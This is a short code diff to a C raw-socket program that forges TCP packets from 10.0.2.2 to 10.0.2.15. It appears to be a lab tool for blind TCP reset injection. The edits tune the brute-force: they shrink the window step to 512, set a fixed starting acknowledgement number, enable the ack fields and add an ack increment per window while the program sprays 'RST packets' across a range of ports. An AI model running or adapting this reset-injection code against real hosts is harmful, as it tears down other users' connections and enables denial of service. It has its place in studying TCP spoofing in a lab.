@@ -64,9 +64,9 @@ int main(int argc, char *argv[])
     struct tcphdr *tcph, *cstcph;
     struct pshdr *psh;
     char *sIP = "10.0.2.2", *dIP = "10.0.2.15";
-    uint16_t sport = 35801, dport, port0 = 30000, port_max = USHRT_MAX - 1, win = 8192;
+    uint16_t sport = 35801, dport, port0 = 30000, port_max = USHRT_MAX - 1, win = 512;
     uint16_t id0 = rand() %(65536);
-    uint32_t seq, seq0 = 0, ack0 = 0;
+    uint32_t seq, seq0 = 0, ack0 = 1656549865;
     size_t tcp_len;
     void *data;
 
@@ -162,8 +162,8 @@ int main(int argc, char *argv[])
             cstcph -> dest = htons(dport);
             tcph -> seq = htonl(seq); // set seq number
             cstcph -> seq = htonl(seq); // set seq number in the checksum header
-            // tcph -> ack_seq = htonl(ack0++); // set ack seq number
-            // cstcph -> ack_seq = htonl(ack0); // set ack seq number in the checksum header
+            tcph -> ack_seq = htonl(ack0); // set ack seq number
+            cstcph -> ack_seq = htonl(ack0); // set ack seq number in the checksum header
             tcph -> check = 0; // reset check sum
             cstcph -> check = 0; // reset check sum  
             tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len); // calculate check sum
@@ -175,6 +175,8 @@ int main(int argc, char *argv[])
             if ((total++) % win == 0) {
                 printf( "%d RST packets sent\n", total);
             }
+
+            ack0 += win;
         }
     }
 // dport = htons(rand() %(65535+1-1024)+1024); // pick another random destination port
